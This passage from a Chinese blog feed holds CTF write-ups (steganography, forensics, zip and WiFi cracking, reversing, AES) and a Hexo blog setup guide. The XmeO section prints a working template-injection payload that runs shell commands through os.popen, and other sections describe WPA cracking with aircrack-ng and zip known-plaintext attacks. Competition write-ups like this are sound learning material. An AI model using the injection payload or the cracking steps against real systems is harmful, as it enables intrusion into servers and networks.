class="string">"22"</span></span><br><span class="line">pciBridge6<span class="selector-class">.pciSlotNumber</span> = <span class="string">"23"</span></span><br><span class="line">pciBridge7<span class="selector-class">.pciSlotNumber</span> = <span class="string">"24"</span></span><br><span class="line">scsi0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"16"</span></span><br><span class="line">vmci0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"32"</span></span><br><span class="line">sata0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"33"</span></span><br><span class="line">vmci0<span class="selector-class">.id</span> = <span class="string">"-119750326"</span></span><br><span class="line">monitor<span class="selector-class">.phys_bits_used</span> = <span class="string">"43"</span></span><br><span class="line">vmotion<span class="selector-class">.checkpointFBSize</span> = <span class="string">"4194304"</span></span><br><span class="line">vmotion<span class="selector-class">.checkpointSVGAPrimarySize</span> = <span class="string">"134217728"</span></span><br><span class="line">cleanShutdown = <span class="string">"TRUE"</span></span><br><span class="line">softPowerOff = <span class="string">"FALSE"</span></span><br><span class="line">svga<span class="selector-class">.guestBackedPrimaryAware</span> = <span class="string">"TRUE"</span></span><br><span class="line">rollingTier0<span class="selector-class">.timeSincelast</span> = <span class="string">"2008"</span></span><br><span class="line">rollingTier1<span class="selector-class">.timeSincelast</span> = <span class="string">"2008"</span></span><br><span class="line">rollingTier2<span class="selector-class">.timeSincelast</span> = <span class="string">"2008"</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>ps:注意用py3,用py2总是报错~同时要把中文随便改成英文，不然编码错误</li></ul><ol start="8"><li><p>接下来就是配置CD-ROM了，看了一下自己的kali的vmx配置，主要多了如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sata0:<span class="number">0</span><span class="selector-class">.deviceType</span> = <span class="string">"cdrom-image"</span></span><br><span class="line">sata0:<span class="number">0</span><span class="selector-class">.fileName</span> = <span class="string">"D:\tongyongPE\kali-linux-2017.2-amd64.iso"</span></span><br><span class="line">sata0:<span class="number">0</span><span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br></pre></td></tr></table></figure></li><li><p>把它加到解密出来的vmx文件，然后再用bibinb密码加密回去</p><blockquote><p>python3 main.py -e -D “Ubuntu 64-bit” -p bibinb dec.vmx myenc.mvx</p></blockquote></li><li>将’myenc.mvx’替换掉原来的’Ubuntu 64-bit.vmx’</li><li>在打开，发现<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205191658.png?raw=true" alt=""></li><li>进入系统的过程按ESC进入Boot Menu,选择CD-ROM Drive,然后选择第一个<br><img src="https://lzy-wi.github.io/img/2018-12-03/5.png" alt=""></li><li>进入系统后看到一个20GB的磁盘,然后进去搜flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205192243.png?raw=true" alt=""></li><li>4个文件放到一起打开<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205192237.png?raw=true" alt=""></li></ol><ul><li>大佬太强~！！</li></ul><h2 id="Traffic-Light"><a href="#Traffic-Light" class="headerlink" title="Traffic_Light"></a>Traffic_Light</h2><ol><li>题目给了一个红绿灯的gif文件</li><li>看了一下有1168帧<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193043.png?raw=true" alt=""></li><li>经过测试，最后发现绿灯为0，红灯为1，黄灯为空格</li><li>手动太累，还是写代码吧<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193039.png?raw=true" alt=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFileMd5</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filename):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    myhash = hashlib.md5()</span><br><span class="line">    f = open(filename,<span class="string">'rb'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        b = f.read(<span class="number">8096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> b :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        myhash.update(b)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> myhash.hexdigest()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1168</span>):</span><br><span class="line">    filepath=<span class="string">"Traffic_Light/IMG%05d.bmp"</span>%i</span><br><span class="line">    <span class="keyword">if</span> GetFileMd5(filepath)==<span class="string">"30a63c9d2ab0f27742a56ed5817723f8"</span>:    <span class="comment">#green</span></span><br><span class="line">        flag += <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">elif</span> GetFileMd5(filepath)==<span class="string">"fe8ab48b0f01daf1015607fdfa135621"</span>:  <span class="comment">#red</span></span><br><span class="line">        flag += <span class="string">"1"</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">FLAG=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)/<span class="number">8</span>):</span><br><span class="line">    FLAG+=chr(int(flag[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="keyword">print</span> FLAG</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193205.png?raw=true" alt=""></p><h2 id="GreatWall"><a href="#GreatWall" class="headerlink" title="GreatWall"></a>GreatWall</h2><ol><li>题目给一张长城的png，4M多，简单binwalk没发什么，考虑LSB<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193823.png?raw=true" alt=""></li><li>保存下来继续binwalk得到一张图片<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193938.png?raw=true" alt=""></li><li>长杠为1短杠为0,+为分隔符,好像只能手工写下来<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193942.png?raw=true" alt=""></li></ol><h2 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s_this"></a>What’s_this</h2><ol><li>题目拿到一张图片What’s_this.jpg</li><li>binwalk，foremost得到<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194518.png?raw=true" alt=""></li><li>打开word文档，找到隐藏信息(并没卵用)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194525.png?raw=true" alt=""></li><li>docx后缀改zip，找到一个”有用的文件”I_Love_You.emf<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194924.png?raw=true" alt=""></li><li>再看2-stage.what这个文件很奇怪，JPG头，PNG尾，并且和zip2.zip里面的2-stage字节大小相同，但crc32不同，估计将2-stage.what改为PNG头后进行明文攻击<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194530.png?raw=true" alt=""><br>改为如下<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194534.png?raw=true" alt=""></li><li>然后改后缀为png能打开(并没什么卵用)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194538.png?raw=true" alt=""></li><li>但是可以发现此时2-stage.png和zip2.zip里面的2-stage的CRC32相同，明文攻击得到zip2.zip密码为Hello_Hi</li><li>得到如下(感觉被戏耍~，一堆没用的信息)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194542.png?raw=true" alt=""></li><li>一下子没了思路，滚去睡觉</li><li>后来官方提示cloacked-pixel，用这个工具对2-stage.png提取，密码为Hello_Hi<blockquote><p>python lsb.py extract 2-stage.png out Hello_Hi</p></blockquote></li></ol><p><a href="https://github.com/livz/cloacked-pixel" target="_blank" rel="noopener">友情链接</a></p><ol start="11"><li>得到加密压缩包zip3.zip和zip4.zip</li><li>zip3.zip用CRC32碰撞得出文本内容为girl同时也是zip4的密码</li><li>很遗憾得到fake flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194546.png?raw=true" alt=""></li><li><p>此时“有用的文件”作用就来了，发现I_Love_You.emf和zip4.zip字节相同，尝试异或两个文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line">f1=<span class="built_in">open</span>(<span class="string">"I_Love_You.emf"</span>,<span class="string">"rb"</span>)</span><br><span class="line">text1=f1.<span class="built_in">read</span>()</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">"zip4.zip"</span>,<span class="string">"rb"</span>)</span><br><span class="line">text2=f2.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">data=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(text1)):</span><br><span class="line">    data+=chr(ord(text1[i])^ord(text2[i]))</span><br><span class="line"></span><br><span class="line">f3=<span class="built_in">open</span>(<span class="string">"flag.zip"</span>,<span class="string">"wb"</span>)</span><br><span class="line">f3.<span class="built_in">write</span>(data)</span><br><span class="line"></span><br><span class="line">f1.<span class="built_in">close</span>()</span><br><span class="line">f2.<span class="built_in">close</span>()</span><br><span class="line">f3.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure></li><li><p>Get flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194549.png?raw=true" alt=""></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;hack1t-复现队里大佬的&quot;&gt;&lt;a href=&quot;#hack1t-复现队里大佬的&quot; class=&quot;headerlink&quot; title=&quot;hack1t(复现队里大佬的)&quot;&gt;&lt;/a&gt;hack1t(复现队里大佬的)&lt;/h2&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>hxb2018部分writeup</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/11/23/hxb2018%E9%83%A8%E5%88%86writeup/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/11/23/hxb2018部分writeup/</id>
    <published>2018-11-23T12:16:16.000Z</published>
    <updated>2018-11-23T12:21:47.626Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><blockquote><p>流量取证，这个流量包中隐藏着一些秘密，你能找出来吗？<br><a id="more"></a></p><ol><li>拿到一个pacp流量包打开,发现全是802.11协议的,是WALN无线报文，并且经过加密，先解密</li><li>上kali用aircrack-ng直接跑</li></ol><ul><li>之前师兄的几个字典都不行，后来发现kali自带的很不错<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201757.png?raw=true" alt=""><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201807.png?raw=true" alt=""></li></ul><ol start="3"><li>wireshark导入密钥<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201810.png?raw=true" alt=""></li><li>导入后发现内容多了许多,字符串搜索flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201813.png?raw=true" alt=""></li></ol></blockquote><h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><blockquote><p>磁盘隐写，这个磁盘上隐藏着一些秘密，你能找出来吗？<br><!-- more --></p><ol><li>题目给了一个-flat.vmdk文件,-flat.vmdk文件,-flat.vmdk文件(坑死了，简单的题目复杂化~)</li></ol><ul><li>本菜鸟本着面向搜索引擎做题的方法，看到了这个<a href="http://www.voidcn.com/article/p-hdykpjdi-gn.html" target="_blank" rel="noopener">重建虚拟机丢失的虚拟磁盘vmdk</a>，然后各种配置esxi环境失败,到后面也没连上去哈哈</li></ul><ol start="2"><li>正常操作一下，发现360压缩能打开（其它压缩软件貌似打不开的，360NB；后来发现360压缩可以看到NTFS交换数据流隐写的,如下面的ADS）<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120203732.png?raw=true" alt=""></li><li>flag0-3.txt都发现flag is not here;are you kidding?</li><li>然后看到flag0-3.txt:ads,打开发现是不可打印字符<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120204610.png?raw=true" alt=""></li><li>用winhex打开发现一串二进制数，把4个文件的二进制数连起来转为ascii即可<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120204747.png?raw=true" alt=""></li></ol><ul><li>还是太菜了，自从护网杯那道内存取证，一直对取证题敬畏，谁会想到这道题这么简单~</li></ul></blockquote><h2 id="Hidden-Write"><a href="#Hidden-Write" class="headerlink" title="Hidden Write"></a>Hidden Write</h2><blockquote><p>没有套路，很常规的隐写，注意看图片末尾</p><ol><li>题目给了一张龙猫的图片，放进winhex看一下<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123173901.png?raw=true" alt=""></li><li>发现3个IHDR和IEND，理论存在3张图片，但binwalk只能得到原图一张，发现后两张少了PNG头，补上<br>89504E470D0A1A0A</li><li>成功binwalk出3张图片<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123173909.png?raw=true" alt=""></li><li>在分离出的第二张图片LSB发现一部分flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123174629.png?raw=true" alt=""></li><li>第一和第三张是盲水印(字节小是原图，大有水印)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123174632.png?raw=true" alt=""></li></ol><ul><li><a href="https://github.com/Cy9nusG4rd3n/BlindWaterMark" target="_blank" rel="noopener">盲水印脚本</a></li></ul><ol start="6"><li>在最原始原图未发现最后一部分flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123174634.png?raw=true" alt=""></li></ol></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="XmeO"><a href="#XmeO" class="headerlink" title="XmeO"></a>XmeO</h2><ol><li><p>注册账号，模板注入</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;''.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="name">'grep</span> -r -n <span class="string">"hxb"</span> /home').read()&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>show得到flag,或者登陆账号admin密码admin,发现里面有大佬遗留下来的做题痕迹，直接show拿走flag23333<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123180431.png?raw=true" alt=""></p></li></ol><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h2><ol><li>有壳，kali下upx -d去壳</li><li>将数据提取出来，附上大佬脚本<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123182337.png?raw=true" alt=""></li></ol><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Common-Crypto"><a href="#Common-Crypto" class="headerlink" title="Common Crypto"></a>Common Crypto</h2><ol><li>密码学是个exe？不高兴又是Re</li><li>ida打开程序大概知道是AES加密，从==sub_140001000== 中也可以看到一些赋值，估计是密钥<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123194308.png?raw=true" alt=""><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123194545.png?raw=true" alt=""></li><li>对于密文，前半部分是AES加密，后半部分则是<strong>decode(‘hex’)</strong></li><li>脚本附上<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">key = '\<span class="keyword">x</span><span class="number">1</span>b\<span class="keyword">x</span><span class="number">2</span>e\<span class="keyword">x</span><span class="number">35</span>\<span class="keyword">x</span><span class="number">46</span>\<span class="keyword">x</span><span class="number">58</span>\<span class="keyword">x</span><span class="number">6</span>e\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">86</span>\<span class="keyword">x</span><span class="number">9</span>b\xa<span class="number">7</span>\xb<span class="number">5</span>\xc<span class="number">8</span>\xd<span class="number">9</span>\xef\xff\<span class="keyword">x</span><span class="number">0</span><span class="keyword">c</span>'</span><br><span class="line">text='<span class="number">8</span>aeb<span class="number">45</span><span class="keyword">c</span><span class="number">62003</span>ba<span class="number">52e46</span><span class="keyword">c</span><span class="number">9600</span>b<span class="number">3699</span>b<span class="number">8</span><span class="keyword">c</span><span class="number">30386334623434393136633963356136</span>'</span><br><span class="line">ciphertext = text.decode('hex')</span><br><span class="line">decodesys = AES.new(key)</span><br><span class="line">print decodesys.decrypt(ciphertext)[:<span class="number">16</span>] + ciphertext[<span class="number">-16</span>:] + '&#125;'</span><br><span class="line">#hxb<span class="number">2018</span>&#123;d<span class="number">9e801</span>ec<span class="number">08</span><span class="keyword">c</span><span class="number">4</span>b<span class="number">44916</span><span class="keyword">c</span><span class="number">9</span><span class="keyword">c</span><span class="number">5</span>a<span class="number">6</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><p><a href="https://rhythmmark.github.io//ReReReeeeeeee/" target="_blank" rel="noopener">大佬的详细WP</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是太菜了，比赛期间本菜鸡都依靠强大的队友瑟瑟发抖的划水，别的大佬都在日主办方服务器~<br><img src="https://github.com/RhythmMark/hello-world/blob/master/pictures/hx1.png?raw=true" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;Flow&quot;&gt;&lt;a href=&quot;#Flow&quot; class=&quot;headerlink&quot; title=&quot;Flow&quot;&gt;&lt;/a&gt;Flow&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;流量取证，这个流量包中隐藏着一些秘密，你能找出来吗？&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>用hexo搭建本地博客</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/11/11/%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E5%8D%9A%E5%AE%A2/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/11/11/用hexo搭建本地博客/</id>
    <published>2018-11-11T07:15:12.000Z</published>
    <updated>2018-11-23T12:00:30.172Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="为什么搭博客？"><a href="#为什么搭博客？" class="headerlink" title="为什么搭博客？"></a>为什么搭博客？</h1><p><del>还不是因为无聊，学习是不可能的，这辈子都不可能学习；打LOL又嫌舍友太菜。</del><br>开个玩笑，搭建自己的博客主要还是因为记录下自己的学习成长过程嘛，队里的大佬都有自己的Blog，自己也不好意思落下，有空的上传下自己的做题的writeup或复现还是不错的。<br><a id="more"></a></p><h1 id="什么是Hexo？"><a href="#什么是Hexo？" class="headerlink" title="什么是Hexo？"></a>什么是Hexo？</h1><p><del>我不知道，网上教程多</del></p><blockquote><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p></blockquote><h1 id="前提环境"><a href="#前提环境" class="headerlink" title="前提环境"></a>前提环境</h1><ol><li><a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a></li><li><a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a></li></ol><ul><li><p>ps:我是在Windows下做的，linux用户只需(git自带)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install nodejs</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> install npm</span><br></pre></td></tr></table></figure></li><li><p>出现以下情况则安装成功</p></li></ul><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111142616.png?raw=true" alt=""><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111142630.png?raw=true" alt=""></p><ul><li>然后你就可以快乐地在一个新文件夹里右键Git Bash Here<blockquote><p>$ npm install -g hexo-cli</p></blockquote></li></ul><p>成功如下</p><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111143118.png?raw=true" alt=""></p><h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><ol><li>在想要建站的文件夹中(必须是空文件夹)输入如下<blockquote><p>hexo init #初始化该文件夹,需要点时间<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111144359.png?raw=true" alt=""></p></blockquote></li><li><p>在文件夹发现多了些文件目录如下</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="variable">_config</span>.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── <span class="variable">_drafts</span></span><br><span class="line">|   └── <span class="variable">_posts</span></span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure></li><li><p>_config.yml是网站配置信息<br><a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">详情</a></p></li><li>继续刚才的文件夹输入如下安装组件<blockquote><p>npm install<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111145232.png?raw=true" alt=""></p></blockquote></li><li>生成静态文件和启动服务器<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo s</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111145616.png?raw=true" alt=""></p><ol start="6"><li>浏览器输入<a href="http://localhost:4000/出现如下，恭喜博客初步建成" target="_blank" rel="noopener">http://localhost:4000/出现如下，恭喜博客初步建成</a><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111145619.png?raw=true" alt=""></li></ol><h1 id="下面介绍一些常用hexo命令"><a href="#下面介绍一些常用hexo命令" class="headerlink" title="下面介绍一些常用hexo命令"></a>下面介绍一些常用hexo命令</h1><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><blockquote><p>$ hexo new [layout] <title></title></p></blockquote><p>新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><blockquote><p>$ hexo generate</p></blockquote><p>生成静态文件,等价于<strong>hexo g</strong></p><h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><blockquote><p>$ hexo server</p></blockquote><p>启动服务器等价于<strong>hexo s</strong>。默认情况下，访问网址为： <a href="http://localhost:4000/。" target="_blank" rel="noopener">http://localhost:4000/。</a></p><h2 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h2><blockquote><p>$ hexo clean</p></blockquote><ul><li>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</li><li>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</li></ul><h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><blockquote><p>hexo deploy</p></blockquote><p>部署网站。等价于<strong>hexo d</strong></p><ul><li>ps:用这个命令要先安装扩展<blockquote><p>npm install hexo-deployer-git –save</p></blockquote></li></ul><h1 id="部署到网站的一般流程"><a href="#部署到网站的一般流程" class="headerlink" title="部署到网站的一般流程"></a>部署到网站的一般流程</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo clean</span></span><br><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo d</span></span><br></pre></td></tr></table></figure><p>不过此前一般在本地测试<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo s</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
